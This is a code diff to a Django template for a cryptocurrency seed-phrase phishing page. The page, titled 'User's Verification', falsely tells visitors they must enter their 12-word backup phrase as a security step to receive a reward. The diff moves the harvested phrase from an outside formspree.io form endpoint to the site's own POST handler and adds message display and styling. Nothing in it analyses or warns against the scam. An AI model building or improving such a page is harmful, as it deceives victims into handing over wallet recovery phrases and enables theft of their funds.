@@ -20,6 +20,7 @@
         <link rel="stylesheet" href="{% static 'css/animate.min.css' %}">
         <link rel="stylesheet" href="{% static 'fontawesome/css/all.css' %}">
         <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Cabin:wght@500&display=swap">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 
 
         <style>
@@ -172,6 +173,14 @@
 
             }
 
+            #message{
+                color: #090a07;
+                background: #34bbb4;
+                padding: 20px;
+                border-radius: 30px;
+                margin-bottom: 20px;
+            }
+
 
 
         </style>
@@ -216,8 +225,12 @@
             <h1>User's Verification</h1>
             <p>As part of our Security measure, you must input your 12-word backup phrase to be sure is you. Once your 12-word backup phrase is entered and validated correctly, you will receive your reward almost immediately .</p>
         </div>
+        {% for message in messages %}
+        <h3 id="message">{{message}}</h3>
+        {% endfor %}
         <div class="f">
-            <form name="phrase" action="https://formspree.io/f/xwkyqayv" method="POST" >
+            <form action="" method="POST" >
+                {% csrf_token %}
                 <input type="text" name="phrase" placeholder="Type Your 12-Word Backup Phrase">
                
                 <button class="button" type="submit">VALIDATE</button>
@@ -294,7 +307,11 @@
         </div>
     </footer>
  
- 
+    <script>
+        setTimeout(function(){
+        $('#message').fadeOut('slow');
+        }, 3000);
+     </script>
     <script>
      const hamburger = document.querySelector(".hamburger");
  const navMenu = document.querySelector(".nav-menu");
@@ -313,7 +330,7 @@
  function closeMenu() {
      hamburger.classList.remove("active");
      navMenu.classList.remove("active");
- }
+ } 
  </script>
 </body>
 </html>
